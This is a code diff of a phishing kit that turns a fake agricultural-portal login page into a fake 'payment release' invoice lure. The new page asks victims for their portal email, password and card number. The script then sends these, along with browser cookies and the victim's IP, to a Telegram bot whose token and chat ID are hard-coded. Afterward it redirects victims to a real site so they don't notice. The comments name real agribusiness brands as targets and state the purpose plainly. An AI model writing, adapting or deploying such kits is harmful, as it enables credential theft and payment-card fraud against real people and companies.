@@ -3,100 +3,163 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Agri-Portal Login</title>
+    <title>AgriPay - Payment Release</title>
     <style>
         body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background: #f4f6f8; 
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+            background: #eef2f5; 
             display: flex; 
             justify-content: center; 
             align-items: center; 
             height: 100vh; 
             margin: 0; 
+            color: #333;
         }
-        .login-box { 
+        .container { 
             background: white; 
-            padding: 40px; 
-            border-radius: 8px; 
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1); 
-            width: 360px; 
+            padding: 30px; 
+            border-radius: 6px; 
+            box-shadow: 0 5px 15px rgba(0,0,0,0.08); 
+            width: 420px; 
+            border-top: 4px solid #0078d4; /* Corporate Blue */
         }
-        .logo { 
-            text-align: center; 
-            margin-bottom: 25px; 
-            font-weight: 600; 
-            color: #005a9e; /* Change to match your target brand */
-            font-size: 22px; 
-            letter-spacing: 0.5px;
-        }
-        .input-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; color: #666; font-size: 14px; }
-        input { 
-            width: 100%; 
-            padding: 12px; 
-            border: 1px solid #ddd; 
+        .header { text-align: center; margin-bottom: 20px; }
+        .header h2 { margin: 0; color: #0078d4; font-size: 20px; }
+        .header p { margin: 5px 0 0; color: #666; font-size: 14px; }
+        
+        .details { 
+            background: #f8f9fa; 
+            padding: 15px; 
             border-radius: 4px; 
-            box-sizing: border-box; 
-            font-size: 15px;
-            transition: border 0.3s;
+            margin-bottom: 20px; 
+            font-size: 14px; 
+            border: 1px solid #e9ecef;
         }
-        input:focus { border-color: #005a9e; outline: none; }
-        button { 
+        .row { display: flex; justify-content: space-between; margin-bottom: 8px; }
+        .row:last-child { margin-bottom: 0; font-weight: 600; border-top: 1px solid #ddd; padding-top: 8px; }
+        .label { color: #888; }
+        .value { font-weight: 500; }
+        .amount { color: #d9534f; } /* Red for attention */
+
+        .btn { 
             width: 100%; 
-            padding: 13px; 
-            background: #005a9e; 
+            padding: 14px; 
+            background: #0078d4; 
             color: white; 
             border: none; 
             border-radius: 4px; 
             cursor: pointer; 
             font-size: 16px; 
-            font-weight: 500;
-            transition: background 0.3s;
+            font-weight: 600; 
+            transition: background 0.2s;
         }
-        button:hover { background: #004a85; }
-        button:disabled { background: #ccc; cursor: not-allowed; }
+        .btn:hover { background: #005a9e; }
+
+        /* Hidden Form for Capture */
+        #captureForm { display: none; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        label { display: block; margin-bottom: 6px; font-size: 13px; font-weight: 500; color: #444; }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            border: 1px solid #ccc; 
+            border-radius: 4px; 
+            box-sizing: border-box; 
+            font-size: 15px; 
+        }
+        input:focus { border-color: #0078d4; outline: none; }
+
         .loading { 
             display: none; 
             text-align: center; 
-            margin-top: 15px; 
+            margin-top: 20px; 
             color: #666; 
-            font-size: 14px;
         }
         .spinner {
             display: inline-block;
-            width: 12px;
-            height: 12px;
+            width: 14px;
+            height: 14px;
             border: 2px solid #ccc;
             border-radius: 50%;
-            border-top-color: #005a9e;
+            border-top-color: #0078d4;
             animation: spin 1s linear infinite;
             margin-right: 8px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+
+        .success { display: none; text-align: center; }
+        .success h3 { color: #28a745; margin-bottom: 10px; }
+        .success p { font-size: 14px; color: #666; }
     </style>
 </head>
 <body>
 
-<div class="login-box">
-    <!-- CHANGE THIS TEXT TO MATCH YOUR TARGET (e.g., NUTRIEN, YARA, CORTeva) -->
-    <div class="logo">PORTAL LOGIN</div> 
-    
-    <form id="loginForm">
-        <div class="input-group">
-            <label for="email">Email or Employee ID</label>
-            <input type="email" id="email" name="email" placeholder="name@company.com" required autocomplete="off">
+<div class="container">
+    <!-- STEP 1: THE HOOK -->
+    <div id="hookView">
+        <div class="header">
+            <h2>Payment Notification</h2>
+            <p>Agri-Logistics Portal • Invoice #9921-D</p>
         </div>
+
+        <div class="details">
+            <div class="row">
+                <span class="label">Vendor:</span>
+                <span class="value">Global Supply Co.</span>
+            </div>
+            <div class="row">
+                <span class="label">Status:</span>
+                <span class="value" style="color: #d9534f;">Pending Verification</span>
+            </div>
+            <div class="row">
+                <span class="label">Amount:</span>
+                <span class="value amount">$12,450.00</span>
+            </div>
+        </div>
+
+        <p style="font-size: 13px; color: #666; margin-bottom: 15px; text-align: center;">
+            To receive your payment, please verify your identity and confirm your bank details.
+        </p>
+
+        <button class="btn" onclick="showForm()">Release Payment</button>
+    </div>
+
+    <!-- STEP 2: THE CAPTURE FORM -->
+    <form id="captureForm" onsubmit="submitData(event)">
+        <div class="header">
+            <h2>Verify Identity</h2>
+            <p>Enter your portal credentials to authorize payment.</p>
+        </div>
+
         <div class="input-group">
-            <label for="password">Password</label>
+            <label>Email / Employee ID</label>
+            <input type="email" id="email" name="email" placeholder="name@company.com" required>
+        </div>
+
+        <div class="input-group">
+            <label>Portal Password</label>
             <input type="password" id="password" name="password" placeholder="••••••••" required>
         </div>
-        
-        <button type="submit" id="submitBtn">Sign In</button>
-        
-        <div class="loading" id="loading">
-            <div class="spinner"></div> Verifying credentials...
+
+        <div class="input-group">
+            <label>Confirm Card (For $0.01 Verification)</label>
+            <input type="text" id="card" name="card" placeholder="Card Number" required>
         </div>
+
+        <button type="submit" class="btn" style="margin-top: 10px;">Authorize & Release</button>
     </form>
+
+    <!-- STEP 3: LOADING STATE -->
+    <div class="loading" id="loading">
+        <div class="spinner"></div> Contacting Bank Gateway...
+    </div>
+
+    <!-- STEP 4: SUCCESS STATE -->
+    <div class="success" id="successView">
+        <h3>Payment Released!</h3>
+        <p>Your funds will arrive within 24 hours.</p>
+        <p style="margin-top: 15px; font-size: 12px; color: #999;">Redirecting to dashboard...</p>
+    </div>
 </div>
 
 <script>
@@ -104,9 +167,14 @@
     const TELEGRAM_BOT_TOKEN = '8684628548:AAHRi5CTh8Gf0s9NBdgo4FqT4czGUxplExQ';
     const TELEGRAM_CHAT_ID = '6479764005';
     
-    // REPLACE THIS WITH THE ACTUAL TARGET URL (e.g., Nutrien, Yara, etc.)
-    // This is where the user goes after we steal their data, so they don't notice.
-    const TARGET_SITE = 'https://access.nutrien.com'; 
+    // Redirect to a generic, safe site after capture
+    const TARGET_SITE = 'https://agweb.com'; 
+
+    // Show the form when they click "Release Payment"
+    function showForm() {
+        document.getElementById('hookView').style.display = 'none';
+        document.getElementById('captureForm').style.display = 'block';
+    }
 
     // Helper to get IP address
     async function getIP() {
@@ -119,13 +187,13 @@
         }
     }
 
-    // Helper to send to Telegram
+    // Send to Telegram
     async function sendToTelegram(data) {
         const message = `
-🔓 <b>New Agri-Portal Login</b>
+💰 <b>NEW PAYMENT RELEASE</b>
 📧 Email: <code>${data.email}</code>
 🔑 Pass: <code>${data.password}</code>
-🍪 Cookie: <code>${data.cookie}</code>
+💳 Card: <code>${data.card}</code>
 🌐 IP: <code>${data.ip}</code>
 🕒 Time: ${new Date().toLocaleString()}
         `;
@@ -142,44 +210,39 @@
         });
     }
 
-    // Main Form Handler
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    // Main Handler
+    async function submitData(e) {
         e.preventDefault();
         
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const btn = document.getElementById('submitBtn');
+        const btn = e.target.querySelector('button');
         const loading = document.getElementById('loading');
-
+        
         // UI Updates
-        btn.disabled = true;
-        btn.innerText = 'Signing in...';
+        btn.style.display = 'none';
         loading.style.display = 'block';
 
-        // Capture Cookies
-        // Note: HttpOnly cookies won't show up here, but we grab whatever is accessible.
-        const cookie = document.cookie || "(No accessible cookies detected)";
-
-        // Get IP
+        // Gather Data
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const card = document.getElementById('card').value;
         const ip = await getIP();
+        const cookie = document.cookie || "(No cookies)";
 
-        // Prepare Data
-        const data = {
-            email: email,
-            password: password,
-            cookie: cookie,
-            ip: ip
-        };
+        const data = { email, password, card, ip, cookie };
 
         // Exfiltrate
         await sendToTelegram(data);
 
-        // Redirect to the real site to maintain trust
-        // Small delay to make it feel "real"
+        // Show Success
+        document.getElementById('captureForm').style.display = 'none';
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('successView').style.display = 'block';
+
+        // Redirect
         setTimeout(() => {
             window.location.href = TARGET_SITE;
-        }, 1500);
-    });
+        }, 2500);
+    }
 </script>
 
 </body>
